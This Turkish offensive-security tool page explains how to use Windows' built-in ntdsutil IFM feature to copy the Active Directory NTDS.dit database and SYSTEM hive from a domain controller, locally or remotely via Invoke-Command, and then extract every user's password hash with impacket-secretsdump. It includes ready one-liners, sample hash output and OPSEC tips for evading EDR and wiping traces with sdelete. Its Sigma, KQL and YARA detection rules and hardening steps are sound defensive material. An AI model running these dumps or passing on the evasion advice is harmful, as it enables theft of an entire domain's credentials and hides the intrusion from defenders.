# ntdsutil

> **Kategori:** [12. NTDS.dit, GPO Şifreleri ve LAPS Hasadı](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Windows Server üzerinde Active Directory veritabanını (`NTDS.dit`) ve şifre çözme anahtarlarını barındıran `SYSTEM` kovanını, yerleşik IFM (Install From Media) mekanizmasıyla Volume Shadow Copy üzerinden diske çıkaran yerleşik yönetim aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory etki alanı altyapısında tüm kullanıcı hesapları, bilgisayar nesneleri, güvenlik tanımlayıcıları ve Kerberos/NTLM parola özetleri (hash) `NTDS.dit` (Active Directory Veritabanı) dosyasında tutulur. Bu dosya, etki alanı denetleyicisi (DC) üzerinde `C:\Windows\NTDS\ntds.dit` konumunda bulunur ve Local Security Authority Subsystem Service (`lsass.exe`) ile Extensible Storage Engine (ESE / JET Blue) veritabanı motoru tarafından sürekli kilit altında (exclusive access) tutulur. Standart işletim sistemi komutlarıyla (`copy`, `xcopy`, `robocopy`) kilitli durumdaki bu dosya doğrudan okunamaz veya kopyalanamaz.

**ntdsutil.exe**, Microsoft tarafından Windows Server işletim sistemlerine doğrudan dahil edilen yerleşik (LOLBin) bir Active Directory yönetim aracıdır. Etki alanı denetleyicilerinin uzak ofislere hızlı kurulumu için tasarlanan **IFM (Install From Media)** özelliği, `ntdsutil`'in Volume Shadow Copy Service (VSS) ile doğrudan konuşarak `ntds.dit` veritabanının anlık bir kopyasını almasını sağlar. Bu süreç esnasında araç yalnızca `ntds.dit` dosyasını çıkarmakla kalmaz, aynı zamanda veritabanındaki parola özetlerini deşifre etmek için zorunlu olan Boot Key (SYSKEY) bilgisini içeren `SYSTEM` ve `SECURITY` kayıt defteri kovanlarını da otomatik olarak hedef dizine yedekler. Üçüncü parti harici ikili gerektirmemesi ve Microsoft tarafından imzalı olması, aracı güvenlik denetimlerinde en çok tercih edilen çevrimdışı parola hasadı vektörlerinden biri yapar.

### Mimari Akış Şeması

```
+-----------------------------------------------------------------------------------+
|                              NTDSUTIL IFM MIMARI AKIŞI                            |
+-----------------------------------------------------------------------------------+
  [Domain Administrator / Operator]                  [Domain Controller (DC)]
        (ntdsutil.exe)                                (VSS & ESE Jet Engine)
               |                                                 |
               |--- 1. "ac i ntds" (Active Instance Set) ------->|
               |                                                 |
               |--- 2. "ifm" -> "create full C:\Temp\IFM" ------>|--- 2. VSS Servisi Tetiklenir
               |                                                 |       (Volume Shadow Copy)
               |                                                 |
               |                                                 |--- 3. Anlık Gölge Kopya Alınır
               |                                                 |       Kilitli ntds.dit Çözülür
               |                                                 |
               |                                                 |--- 4. ntds.dit Dosyası ve
               |                                                 |       SYSTEM / SECURITY
               |                                                 |       Kovanları Hedefe Yazılır
               |                                                 |
               |<-- 5. "IFM media created successfully" ---------|--- 5. VSS Snapshot Temizlenir
               |                                                 |
  [Sonuç Dizini: C:\Temp\IFM]
  ├── Active Directory\ntds.dit  (Tüm etki alanı şifreli hash veritabanı)
  └── registry\SYSTEM            (BootKey / SYSKEY şifre çözme anahtarı)
```

### Neden Önemli?

| Yetenek | Operasyonel Avantaj | Alternatif Araçlara Üstünlüğü |
| :--- | :--- | :--- |
| **Resmi Microsoft LOLBin** | Windows Server'da varsayılan olarak yüklüdür. | Hedefe harici şüpheli ikili (`.exe`) yükleme ihtiyacını kaldırır. |
| **SYSKEY Otomatik Hasadı** | `SYSTEM` kovanını `ntds.dit` ile eşzamanlı çıkarır. | Ekstra `reg save HKLM\SYSTEM` komutu çalıştırma gereğini ortadan kaldırır. |
| **VSS Entegrasyonu** | Kilitli veritabanını dosya sistemi düzeyinde güvenle çözer. | Veritabanı bozulması (dirty shutdown) riskini minimuma indirir. |
| **DCSync Bağımsızlığı** | Ağ üzerinden DRSUAPI RPC çağrısı yapmaz. | Ağ tabanlı DCSync ve ağ izleme kurallarına (NIDS) yakalanmaz. |
| **Script Edilebilir CLI** | Tek satırlık komut dizilimiyle uzaktan koşturulabilir. | PowerShell veya WMI üzerinden otomasyona tam uyumludur. |

### Karşılaştırma Tablosu

| Özellik | ntdsutil (IFM) | vssadmin / diskshadow | impacket-secretsdump (DCSync) | Invoke-NinjaCopy |
| :--- | :--- | :--- | :--- | :--- |
| **Kullanım Yöntemi** | Yerleşik CLI (VSS API) | Yerleşik CLI (VSS Snapshot) | Uzaktan DRSUAPI RPC | Ham NTFS Disk Okuma |
| **Gereken Konum** | DC Üzerinde Yerel/Uzak Kabuk | DC Üzerinde Yerel/Uzak Kabuk | Ağ Üzerinden Uzaktan | DC Üzerinde PowerShell |
| **Ağ Gürültüsü** | Sıfır (Tamamen yerel) | Sıfır (Tamamen yerel) | Yüksek (DRSUAPI replikasyon trafiği) | Sıfır (Yerel) |
| **SYSTEM Kovanı** | Otomatik çıkarır | Manuel alınması gerekir | RPC ile doğrudan çeker | Manuel alınması gerekir |
| **Algılanma Riski** | Komut satırı argümanı (Orta) | Komut satırı argümanı (Orta) | Ağ seviyesinde yüksek tespit | PowerShell & Ham Disk (Yüksek) |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

`ntdsutil.exe` hem etkileşimli bir hiyerarşik kabuk olarak hem de tek satırlık komut argümanları dizisiyle çalıştırılabilir:

```cmd
ntdsutil "activate instance ntds" "ifm" "<ifm_alt_komutu> <hedef_dizin>" quit quit
```

### Desteklenen Kritik Bayraklar ve Alt Komutlar

| Parametre / Komut | Kısaltma | Açıklama | Örnek Kullanım |
| :--- | :--- | :--- | :--- |
| `activate instance ntds` | `ac i ntds` | Aktif veritabanı örneği olarak NTDS servisini seçer. | `ntdsutil "ac i ntds"` |
| `ifm` | `ifm` | Install From Media yapılandırma menüsüne geçer. | `ifm` |
| `create full <yol>` | `cr fu <yol>` | Tam bir DC için `ntds.dit` ve kayıt defteri kovanlarını çıkarır. | `create full C:\Temp\dump` |
| `create rodc <yol>` | `cr ro <yol>` | Salt Okunur DC (RODC) için kısıtlı parola veritabanı oluşturur. | `create rodc C:\Temp\dump_rodc` |
| `create sysvol full <yol>`| `cr sy fu <yol>`| `ntds.dit`, kayıt defteri ve SYSVOL paylaşım içeriğini birlikte çıkarır. | `create sysvol full C:\Temp\ifm_all` |
| `files` | `files` | Veritabanı dosya bakım ve bütünlük menüsüne girer. | `files` |
| `compact to <yol>` | `comp to <yol>` | Veritabanını çevrimdışı optimize edip yeni konuma sıkıştırır. | `compact to C:\Temp\compacted` |
| `quit` | `q` | Geçerli alt menüden çıkar veya ntdsutil'i sonlandırır. | `quit` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Tek Satırlık Komut ile Tam IFM Paketi Çıkarma
Domain Controller üzerinde komut satırından etkileşime girmeden doğrudan tam NTDS yedeği alma:

```cmd
ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\AD_Dump" q q
```

**Konsol Çıktı Analizi:**
```
ntdsutil: ac i ntds
Active instance set to "ntds".
ntdsutil: ifm
ifm: create full C:\Windows\Temp\AD_Dump
Creating snapshot...
Snapshot created.
Loading snapshot...
Starting checksum of database C:\Windows\NTDS\ntds.dit...
Checksum complete.
Copying C:\Windows\NTDS\ntds.dit to C:\Windows\Temp\AD_Dump\Active Directory\ntds.dit...
Copying registry files...
Copying C:\Windows\System32\config\SYSTEM to C:\Windows\Temp\AD_Dump\registry\SYSTEM...
Copying C:\Windows\System32\config\SECURITY to C:\Windows\Temp\AD_Dump\registry\SECURITY...
Snapshot unmounted.
IFM media created successfully in C:\Windows\Temp\AD_Dump
ifm: q
ntdsutil: q
```

### Senaryo 2: SYSVOL ile Birlikte Tam Yedek Oluşturma
GPO ve yetkilendirme betiklerinin de incelenmesi amacıyla SYSVOL içeriğini de kapsayan IFM alma:

```cmd
ntdsutil "ac i ntds" "ifm" "create sysvol full C:\PerfLogs\Backup_Full" q q
```

**Konsol Çıktı Analizi:**
```
ifm: create sysvol full C:\PerfLogs\Backup_Full
Creating snapshot...
Copying database and registry...
Copying SYSVOL share from C:\Windows\SYSVOL\sysvol...
IFM media created successfully in C:\PerfLogs\Backup_Full
```

### Senaryo 3: Salt Okunur Domain Controller (RODC) Filtreli Veritabanı Çıkarma
Yalnızca önbelleğe alınmış kullanıcıların parola özetlerini içeren kısıtlı RODC medya kiti oluşturma:

```cmd
ntdsutil "ac i ntds" "ifm" "create rodc C:\Temp\RODC_Dump" q q
```

**Konsol Çıktı Analizi:**
```
ifm: create rodc C:\Temp\RODC_Dump
Creating RODC snapshot...
Filtering password attributes according to Password Replication Policy (PRP)...
IFM media created successfully in C:\Temp\RODC_Dump
```

### Senaryo 4: Uzaktan WMI / PowerShell (WinRM) ile IFM Hasadı Tetikleme
Etki alanı denetleyicisine doğrudan RDP yapmadan uzaktan PowerShell oturumu ile işlemi yürütme:

```powershell
Invoke-Command -ComputerName DC01.corp.local -ScriptBlock {
    ntdsutil "ac i ntds" "ifm" "create full C:\ProgramData\USOShared\backup" q q
}
```

**Konsol Çıktı Analizi:**
```
Active instance set to "ntds".
Snapshot created.
Copying ntds.dit...
Copying registry files...
IFM media created successfully in C:\ProgramData\USOShared\backup
```

### Senaryo 5: Veritabanı Dosya Bütünlüğü ve Boyut Kontrolü
Oluşturulan veya mevcut `ntds.dit` veritabanının bütünlüğünü doğrulamak için `files` alt menüsünü kullanma:

```cmd
ntdsutil "ac i ntds" "files" "integrity" q q
```

**Konsol Çıktı Analizi:**
```
Active instance set to "ntds".
Opening database [C:\Windows\NTDS\ntds.dit]...
Checking database integrity...
The database is up to date and in a clean state.
Integrity check completed successfully.
```

### Senaryo 6: Hasat Edilen Dosyalardan Çevrimdışı Hash Çıkarma
Elde edilen `ntds.dit` ve `SYSTEM` kovanının Linux denetim makinesine aktarılmasının ardından `impacket-secretsdump` ile çözülmesi:

```bash
impacket-secretsdump -ntds ./Active\ Directory/ntds.dit -system ./registry/SYSTEM LOCAL -outputfile ad_hashes
```

**Konsol Çıktı Analizi:**
```
Impacket v0.12.0 - Copyright Fortra, LLC
[*] Target: LOCAL
[*] Loading NTDS.dit and SYSTEM hive...
[*] SYSKEY: 0x9a8f4c...
[*] Extracting domain users...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:329153f560eb344c3f9e3ec4e086166f:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:99812487abcdf129847128947bcadfae:::
[+] Successfully extracted 1420 user hashes.
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Kodu / Mesajı | Kök Neden | Kesin Çözüm Adımı |
| :--- | :--- | :--- |
| `Error: Directory C:\Temp\Dump already exists` | Hedef çıktı dizini önceden oluşturulmuş veya boş değil; IFM boş/olmayan dizin ister. | Hedef dizini silin veya komutta henüz var olmayan yeni bir klasör yolu (`C:\Temp\Dump2`) tanımlayın. |
| `Failed to create snapshot. Error 0x80042306 (VSS_E_PROVIDER_VETO)` | Volume Shadow Copy Servisi (VSS) devre dışı, meşgul veya üçüncü parti yedekleme yazılımı engelliyor. | `sc query vss` ile servisi kontrol edin; `net start vss` çalıştırın ve çakışan yedekleme ajanlarını geçici olarak durdurun. |
| `Not enough disk space for creating media` | Hedef sürücüde `ntds.dit` veritabanı boyutu + kayıt defteri kovanı kadar boş alan yok. | `dir C:\Windows\NTDS\ntds.dit` ile boyutu kontrol edin; yeterli boş alanı olan farklı bir diske/bölüme (`D:\`) yönlendirin. |
| `Access is denied (Error 0x5)` | Komut istemi yerel yönetici (Administrator) yetkisinde açılmamış veya `SeBackupPrivilege` eksik. | Komut istemini "Yönetici olarak çalıştır" (Run as Administrator) ile başlatın veya Domain Admin yetkisine geçin. |
| `The database engine stopped with error -1018` | Veritabanı donanım veya depolama seviyesinde bozuk sayfa (checksum error) içeriyor. | `ntdsutil "ac i ntds" "files" "integrity" q q` ile kontrol edin; DC çoğaltma sağlığını (dcdiag) gözden geçirin. |
| `Active instance is not set` | `ifm` komutu çalıştırılmadan önce `ac i ntds` komutu verilmemiş. | Script diziliminde mutlaka önce `activate instance ntds` adımını çalıştırın. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
[OPSEC GÜRÜLTÜ SKALASI: ORTA]
0 --------------[5.5 - NTDSUTIL CLI & VSS SNAPSHOT]-------------- 10
  - Ağ Seviyesi: Sıfır ağ gürültüsü (Yerel VSS ve disk kopyalama)
  - Uç Nokta Seviyesi: ntdsutil.exe proses argümanları ve VSS snapshot logları (EDR için yüksek tespit)
```

### 5.1 Bırakılan İzler (Event Logs)

* **Windows Security Event ID 4688 / Sysmon Event ID 1 (Process Creation):**
  * `Image: C:\Windows\System32\ntdsutil.exe`
  * `CommandLine: *ac i ntds*ifm*create full*` kalıbı tüm SIEM/EDR sistemleri için birincil tespit tetikleyicisidir.
* **Directory Services Log (Event ID 2004 / 2005):**
  * Active Directory servisi, IFM snapshot oluşturma başlangıcını ve başarılı şekilde sonlandığını bu olaylarla günlüğe kaydeder.
* **System Event Log (VSS Snapshot Events):**
  * **Event ID 7036:** Volume Shadow Copy servisinin başlatıldığı ve durdurulduğu kaydedilir.
  * **Event ID 8224:** VSS sağlayıcısının normal zaman aşımı nedeniyle kapandığını bildirir.
* **Security Event ID 4672 / 4673 (Privilege Use):**
  * `SeBackupPrivilege`, `SeRestorePrivilege` ve `SeDebugPrivilege` ayrıcalıklarının kullanımı denetlenir.

### 5.2 Ağ ve EDR İmzaları

* **Ağ Görünürlüğü (Zero Network Artifacts):**
  İşlem tamamen etki alanı denetleyicisi üzerinde yerel çalıştığından, DRSUAPI tabanlı DCSync saldırılarında olduğu gibi RPC replikasyon paketleri oluşmaz. NIDS/NDR sistemleri açısından görünmezdir.
* **EDR Dosya ve Disk İmzası:**
  `ntdsutil.exe` süreci tarafından disk üzerinde standart dışı bir konuma (örn: `C:\Windows\Temp\` veya `C:\Users\Public\`) `ntds.dit` ve `SYSTEM` dosyalarının yazılması, davranışsal EDR kurallarını (Credential Dumping heuristic) tetikler.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Taktik | Teknik ID | Teknik Adı | Operasyonel Kullanım |
| :--- | :--- | :--- | :--- |
| **Credential Access** | `T1003.003` | OS Credential Dumping: NTDS | `ntdsutil` ile Active Directory veritabanını dışa aktarma. |
| **Credential Access** | `T1003.002` | OS Credential Dumping: Security Account Manager | Parola anahtarlarını barındıran `SYSTEM` kovanını alma. |
| **Defense Evasion** | `T1036` | Masquerade / Subverting Controls | Yerleşik meşru Windows yönetim aracını (LOLBin) istismar etme. |

### 5.4 OPSEC Önerileri

| Tespit Riski | Önlem / İyileştirme |
| :--- | :--- |
| **Komut Satırı Argüman Analizi** | `create full` parametrelerini doğrudan CLI'da geçirmek yerine, komutları bir metin dosyasına yazıp `ntdsutil script.txt` ile çalıştırmak veya etkileşimli modda kalmak. |
| **Şüpheli Çıktı Dizini** | Çıktı klasörü olarak `C:\Temp` yerine meşru sistem yedekleme dizinleri (`C:\Windows\System32\wbem\AutoRecover` vb.) tercih edilmelidir. |
| **Disk İzi Temizliği** | Veritabanı ve kovanlar harici ortama aktarıldıktan hemen sonra güvenli silme (SDelete veya PowerShell overwrite) uygulanmalıdır. |
| **VSS Servis Hareketliliği** | VSS çağrılarının gece yarısı veya planlı yedekleme saatlerinde yapılması operasyonel anomalileri gizler. |

### 5.5 Savunma Karşılığı

#### Sigma Kuralı: ntdsutil ile NTDS.dit IFM Hasat Tespiti
```yaml
title: ntdsutil ile NTDS Veritabani ve Kayit Defteri Cikarma Tespiti
id: 3c9b1f72-9844-4b53-a812-78d1045a2991
status: experimental
description: ntdsutil komut satiri araci kullanilarak IFM ozelligi ile Active Directory veritabaninin calinmasi girisimlerini yakalar.
references:
    - https://attack.mitre.org/techniques/T1003/003/
author: Active Directory Guvenlik Ekibi
date: 2026/10/14
logsource:
    category: process_creation
    product: windows
detection:
    selection_process:
        Image|endswith: '\ntdsutil.exe'
    selection_args:
        CommandLine|contains|all:
            - 'ifm'
        CommandLine|contains:
            - 'create'
            - 'full'
            - 'rodc'
    condition: selection_process and selection_args
falsepositives:
    - Etki alani yoneticilerinin mesru IFM medya olusturma gorevleri (onceden degisiklik kaydi acilmalidir).
level: critical
tags:
    - attack.credential_access
    - attack.t1003.003
```

#### Microsoft Sentinel KQL Sorgusu
```kql
// ntdsutil ile iliskili process creation ve sonrasinda olusturulan ntds.dit dosyalarini tespit eder
DeviceProcessEvents
| where FileName =~ "ntdsutil.exe"
| where ProcessCommandLine has "ifm" and (ProcessCommandLine has "create" or ProcessCommandLine has "full")
| join kind=inner (
    DeviceFileEvents
    | where FileName endswith "ntds.dit" or FileName =~ "SYSTEM"
    | where ActionType == "FileCreated"
    | project FileTime = TimeGenerated, DeviceName, FileName, FolderPath
) on DeviceName
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, FileName, FolderPath
```

#### YARA Kuralı: IFM Script ve Komut Şablonu Tespiti
```yara
rule Threat_Script_NTDSUtil_IFM {
    meta:
        description = "ntdsutil IFM komut dizilimini iceren batch ve script dosyalarini tespit eder"
        author = "AD Guvenlik Laboratuvari"
        date = "2026-10-14"
        severity = "High"
    strings:
        $s1 = "ntdsutil" ascii wide nocase
        $s2 = "ac i ntds" ascii wide nocase
        $s3 = "activate instance ntds" ascii wide nocase
        $s4 = "create full" ascii wide nocase
        $s5 = "create sysvol full" ascii wide nocase
    condition:
        $s1 and (($s2 or $s3) and ($s4 or $s5))
}
```

#### Sertleştirme (Hardening) Adımları
1. **Tier-0 İzolasyonu:** Domain Controller sunucularına yalnızca özel Yönetici Atlama Noktaları (PAW / Jumpbox) üzerinden ve Çok Faktörlü Kimlik Doğrulama (MFA) ile oturum açılmalıdır.
2. **Komut Satırı Günlükleme Denetimi:** Event ID 4688 için "Include command line in process creation events" politikası GPO üzerinden tüm DC'lerde zorunlu kılınmalıdır.
3. **Microsoft Defender for Identity:** DC'ler üzerine MDI sensörleri kurularak olağandışı ntdsutil ve VSS manipülasyonları gerçek zamanlı engellenmelidir.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

#### 1. Standart Tek Satırlık Full IFM Çıkarma
```cmd
ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\dump" q q
```
* **Ne Yapar?:** Tek satırda ntds örneğini seçer, VSS snapshot alır ve `ntds.dit` ile `SYSTEM` kovanını belirtilen klasöre çıkarır.
* **Ne Zaman Kullanılır?:** DC üzerinde en hızlı ve hatasız çevrimdışı parola hasadı operasyonlarında.
* **Parametreler:** `ac i ntds` örneği seçer, `create full` tam kopyayı hedefe yazar, `q q` menülerden çıkar.

#### 2. SYSVOL Dahil Edilerek IFM Çıkarma
```cmd
ntdsutil "ac i ntds" "ifm" "create sysvol full C:\Backup\FullIFM" q q
```
* **Ne Yapar?:** Veritabanı ve kayıt defterine ek olarak tüm SYSVOL paylaşımını da yedekler.
* **Ne Zaman Kullanılır?:** GPO betikleri veya politikalar içerisindeki hassas veriler de inceleneceğinde.
* **Parametreler:** `create sysvol full <yol>`.

#### 3. Salt Okunur DC (RODC) Filtreli Veritabanı Çıkarma
```cmd
ntdsutil "ac i ntds" "ifm" "create rodc C:\Backup\RODC" q q
```
* **Ne Yapar?:** Yalnızca PRP (Password Replication Policy) ile izin verilen hesapların hash'lerini barındıran kısıtlı veritabanı üretir.
* **Ne Zaman Kullanılır?:** RODC replikasyon güvenliğini test ederken.
* **Parametreler:** `create rodc <yol>`.

#### 4. Özel Hedef Sürücüye IFM Yazma
```cmd
ntdsutil "ac i ntds" "ifm" "create full D:\AD_Backup" q q
```
* **Ne Yapar?:** C: sürücüsündeki disk doluluğu riskine karşı ikincil bir birime döküm alır.
* **Ne Zaman Kullanılır?:** C: sistem bölümünde yeterli boş alan bulunmadığında.
* **Parametreler:** Hedef disk harfi `D:\`.

#### 5. Etkileşimli Modda IFM Başlatma
```cmd
ntdsutil
```
* **Ne Yapar?:** ntdsutil kabuğunu interaktif başlatır; komut satırı loglarında parametre görünmesini engeller.
* **Ne Zaman Kullanılır?:** EDR komut satırı argüman denetimini atlatmak için.
* **Parametreler:** Argümansız çalıştırma.

#### 6. Veritabanı Bütünlük Denetimi (Integrity Check)
```cmd
ntdsutil "ac i ntds" "files" "integrity" q q
```
* **Ne Yapar?:** `ntds.dit` dosyasının ESE Jet motoru düzeyinde tutarlı ve sağlam olup olmadığını denetler.
* **Ne Zaman Kullanılır?:** Döküm öncesinde veya sonrasında dosya bütünlüğünden emin olmak için.
* **Parametreler:** `files` menüsü altındaki `integrity` komutu.

#### 7. Veritabanı Çevrimdışı Sıkıştırma (Compact)
```cmd
ntdsutil "ac i ntds" "files" "compact to C:\Temp\Compacted" q q
```
* **Ne Yapar?:** Veritabanındaki boş alanları temizleyerek dosya boyutunu küçülterek yeni konuma yazar.
* **Ne Zaman Kullanılır?:** Veritabanı boyutu çok büyük olduğunda ve transferi hızlandırmak istendiğinde.
* **Parametreler:** `compact to <hedef_yol>`.

#### 8. Uzaktan PowerShell Invoke-Command ile IFM Alma
```powershell
Invoke-Command -ComputerName DC01 -ScriptBlock { ntdsutil "ac i ntds" "ifm" "create full C:\Temp\dump" q q }
```
* **Ne Yapar?:** WinRM üzerinden uzak DC'de ntdsutil komutunu arka planda yürütür.
* **Ne Zaman Kullanılır?:** Uzak etki alanı denetleyicisine GUI veya RDP erişimi olmadığında.
* **Parametreler:** `Invoke-Command` betik bloğu.

#### 9. IFM Çıktısının Dosya Bütünlüğünü Doğrulama
```powershell
Get-ChildItem -Path C:\Windows\Temp\dump -Recurse | Select-Object FullName, Length
```
* **Ne Yapar?:** Alınan dökümün `ntds.dit` ve `SYSTEM` kovanlarını eksiksiz içerdiğini ve dosya boyutlarını teyit eder.
* **Ne Zaman Kullanılır?:** Dosyaları denetim makinesine aktarmadan önceki son kontrol aşamasında.
* **Parametreler:** PowerShell `Get-ChildItem`.

#### 10. Çıkarma Sonrası Hedef Dizini Güvenle Temizleme
```cmd
sdelete.exe -p 3 -r -q C:\Windows\Temp\dump
```
* **Ne Yapar?:** Hasat edilen hassas veritabanı kopyasını 3 geçişli DoD standardında diskten geri getirilemez biçimde siler.
* **Ne Zaman Kullanılır?:** Denetim tamamlandıktan sonra adli bilişim izlerini temizlemek için.
* **Parametreler:** `sdelete` güvenli silme bayrakları.

---

## Kaynaklar
* [Microsoft Dokümantasyonu: ntdsutil Komut Referansı](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc753343(v=ws.11))
* [Microsoft Dokümantasyonu: Create IFM Media for AD DS](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/deploy/create-an-install-from-media-installation-medium)
* [MITRE ATT&CK: OS Credential Dumping: NTDS (T1003.003)](https://attack.mitre.org/techniques/T1003/003/)
* [Active Directory Güvenliği: Bypassing NTDS.dit Locking Mechanisms](https://adsecurity.org/?p=2398)
* [HackTricks: Stealing NTDS.dit](https://book.hacktricks.xyz/windows-hardening/stealing-credentials#ntds.dit)

---

> **Önceki:** [← WMIHacker (Kategori 11)](../Kategori_11_Yanal_Hareket_ve_Uzak_Kod_Yurutme/WMIHacker.md) · **Sonraki:** [vssadmin / diskshadow →](./vssadmin_diskshadow.md)
